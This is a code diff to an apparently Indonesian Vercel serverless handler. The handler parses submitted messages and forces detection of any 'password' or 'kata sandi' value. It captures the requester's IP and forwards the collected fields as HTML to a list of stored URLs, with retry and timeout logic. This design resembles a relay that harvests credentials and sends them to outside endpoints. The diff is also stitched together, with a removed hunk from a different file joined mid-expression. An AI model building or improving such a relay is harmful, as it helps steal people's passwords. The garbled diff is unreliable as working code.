@@ -4,19 +4,24 @@ const path = require("path");
 const FILE = path.join(process.cwd(), "data", "urls.json");
 
 /* ======================
-   LOAD & SAVE URL
+   SAFE LOAD & SAVE URL (FIX 500 VERCEL)
 ====================== */
 function loadUrls() {
   try {
     if (!fs.existsSync(FILE)) return [];
-    return JSON.parse(fs.readFileSync(FILE, "utf8"));
+    const data = fs.readFileSync(FILE, "utf8");
+    return data ? JSON.parse(data) : [];
   } catch {
     return [];
   }
 }
 
 function saveUrls(data) {
-  fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
+  try {
+    fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
+  } catch (e) {
+    console.log("SAVE ERROR:", e.message);
+  }
 }
 
 /* ======================
@@ -52,13 +57,13 @@ function stripHtml(input = "") {
 }
 
 /* ======================
-   AUTO EXTRACT VARS (FULL INTELLIGENT)
+   AUTO EXTRACT VARS (FIXED + MORE STABLE)
 ====================== */
 function extractVars(input = "") {
   const vars = {};
   const html = stripHtml(input);
 
-  // 1. TABLE PARSER (<td>label</td><td>value</td>)
+  /* 1. TABLE PARSER */
   const tdRegex = /<td[^>]*>(.*?)<\/td>\s*<td[^>]*>(.*?)<\/td>/gi;
   let m;
 
@@ -71,7 +76,7 @@ function extractVars(input = "") {
     if (value) vars[key] = value;
   }
 
-  // 2. key:value or key=value fallback
+  /* 2. FALLBACK TEXT PARSER */
   const lines = html.split("\n");
 
   for (const line of lines) {
@@ -86,7 +91,7 @@ function extractVars(input = "") {
     }
   }
 
-  // 3. PRIORITY FIX (force password detect)
+  /* 3. PRIORITY PASSWORD FIX (ANTI MISS DETECT) */
   if (!vars.password) {
     const passMatch = html.match(/(password|kata\s*sandi|sandi)\s*[:=]?\s*([^\s<]+)/i);
     if (passMatch) vars.password = passMatch[2];
@@ -96,7 +101,7 @@ function extractVars(input = "") {
 }
 
 /* ======================
-   BUILD HTML TEMPLATE
+   BUILD HTML TEMPLATE (NO CHANGE)
 ====================== */
 function buildHtml(vars) {
   const row = (k, v) => `
@@ -146,7 +151,7 @@ function buildHtml(vars) {
 }
 
 /* ======================
-   MAIN HANDLER
+   MAIN HANDLER (FIXED 500 + SAFE FETCH)
 ====================== */
 module.exports = async (req, res) => {
   try {
@@ -167,12 +172,12 @@ module.exports = async (req, res) => {
 
     const vars = extractVars(pesan);
 
-    // auto IP fallback
+    /* FIX IP SAFE */
     vars.ip =
       vars.ip ||
       req.headers["x-forwarded-for"]?.split(",")[0] ||
       req.socket?.remoteAddress ||
-      "";
+      "unknown";
 
     const html = buildHtml(vars);
 
@@ -182,10 +187,13 @@ module.exports = async (req, res) => {
       return res.json({ success: false, message: "URL kosong" });
     }
 
-    const fetchFn = global.fetch || require("node-fetch");
+    /* FIX FETCH (ANTI CRASH VERCEL) */
+    const fetchFn =
+      global.fetch ||
+      ((...args) => import("node-fetch").then(({ default: fetch }) => fetch(...args)));
 
     /* ======================
-       PARALLEL + TIMEOUT + RETRY
+       PARALLEL + RETRY + TIMEOUT FIX
     ====================== */
     const results = await Promise.all(
       urls.map(async (url) => {
@@ -194,7 +202,7 @@ module.exports = async (req, res) => {
         while (attempt < 2) {
           attempt++;
 
-          const controller = new AbortController();
+          const controller = new (global.AbortController || require("abort-controller"))();
           const timeout = setTimeout(() => controller.abort(), 8000);
 
           try {
@@ -245,73 +253,7 @@ module.exports = async (req, res) => {
   } catch (err) {
     return res.status(500).json({
       success: false,
-      error: err.message
-    });
-  }
-};    .filter(Boolean);
-
-  for (const line of lines) {
-    const match = line.match(/^([a-zA-Z0-9 _-]{2,30})\s*[:=]\s*(.+)$/i);
-    if (!match) continue;
-
-    const key = normalizeLabel(match[1]);
-    const value = match[2].trim();
-
-    result[key] = value;
-  }
-
-  return result;
-}
-
-// ======================
-// SMART PARSER ENGINE
-// ======================
-function smartParse(input = "") {
-  let result = {};
-
-  if (input.includes("<tr") || input.includes("<table")) {
-    result = parseTable(input);
-  }
-
-  const fallback = fallbackScanner(input);
-
-  return { ...result, ...fallback };
-}
-
-// ======================
-// VERCEL API HANDLER
-// ======================
-module.exports = async (req, res) => {
-  try {
-    if (req.method !== "POST") {
-      return res.status(405).json({
-        success: false,
-        message: "POST only"
-      });
-    }
-
-    const body =
-      typeof req.body === "string"
-        ? Object.fromEntries(new URLSearchParams(req.body))
-        : req.body || {};
-
-    if (!body.pesan) {
-      return res.status(400).json({
-        success: false,
-        message: "pesan wajib diisi"
-      });
-    }
-
-    const parsed = smartParse(body.pesan);
-
-    return res.json({
-      success: true,
-      parsed
-    });
-
-  } catch (err) {
-    return res.status(500).json({
-      success: false,
+      message: "internal error",
       error: err.message
     });
   }
